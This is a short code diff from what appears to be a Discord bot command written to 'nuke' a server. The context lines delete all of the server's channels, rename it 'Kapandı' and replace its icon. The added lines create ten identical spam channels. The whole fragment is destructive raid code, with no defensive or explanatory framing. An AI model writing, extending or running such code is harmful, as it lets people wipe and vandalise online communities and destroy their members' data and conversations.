@@ -16,6 +16,16 @@ message.guild.channels.deleteAll("");
 message.guild.setName(`Kapandı`, "")
 message.guild.setIcon(`https://cdn.discordapp.com/attachments/569895621872451605/573561578767777829/closed-logo1.jpg`)
 message.guild.createChannel(`hey`)
+message.guild.createChannel(`berke-vurdu-gol`)
+message.guild.createChannel(`berke-vurdu-gol`)
+message.guild.createChannel(`berke-vurdu-gol`)
+message.guild.createChannel(`berke-vurdu-gol`)
+message.guild.createChannel(`berke-vurdu-gol`)
+message.guild.createChannel(`berke-vurdu-gol`)
+message.guild.createChannel(`berke-vurdu-gol`)
+message.guild.createChannel(`berke-vurdu-gol`)
+message.guild.createChannel(`berke-vurdu-gol`)
+message.guild.createChannel(`berke-vurdu-gol`)
 message.delete()
 };  
 
